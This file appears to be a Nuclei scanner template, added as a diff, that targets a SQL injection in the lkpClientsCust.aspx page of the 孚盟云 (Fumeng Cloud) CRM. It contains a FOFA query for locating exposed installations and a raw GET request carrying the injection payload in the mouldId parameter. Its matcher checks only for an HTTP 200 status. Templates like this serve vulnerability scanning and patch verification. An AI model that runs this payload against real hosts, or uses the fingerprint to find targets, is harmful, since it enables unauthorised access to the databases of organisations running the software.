@@ -1,0 +1,29 @@
+id: poc-li1v0gtqmt4nrg4u
+info:
+  name: 孚盟云 lkpClientsCust.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/li1v0gtqmt4nrg4u'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: li1v0gtqmt4nrg4u
+    fofa: app="孚盟软件-孚盟云"
+http:
+- raw:
+  - 'GET /PagePopWindow/lkpClientsCust.aspx?datastyletype=&searchfields=&FilterSQL=&mouldId=1''+OR+1=@@VERSION-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
